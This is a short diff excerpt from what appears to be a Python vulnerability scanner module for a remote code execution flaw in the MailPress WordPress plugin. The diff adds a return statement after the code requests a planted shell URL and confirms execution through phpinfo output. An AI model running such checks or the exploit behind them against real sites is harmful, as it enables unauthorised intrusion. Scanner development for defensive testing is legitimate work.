@@ -49,6 +49,7 @@ class wordpress_plugin_mailpress_rce_BaseVerify:
             req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
             if r"Configuration File (php.ini) Path" in req2.text:
                 cprint("[+]存在wordpress 插件mailpress远程代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshellurl: "+shellurl, "red")
+                return True, vulnurl, "wordpress 插件mailpress远程代码执行", payload, req.text
             else:
                 cprint("[-]不存在wordpress_plugin_mailpress_rce漏洞", "white", "on_grey")
                 return False, None, None, None, None
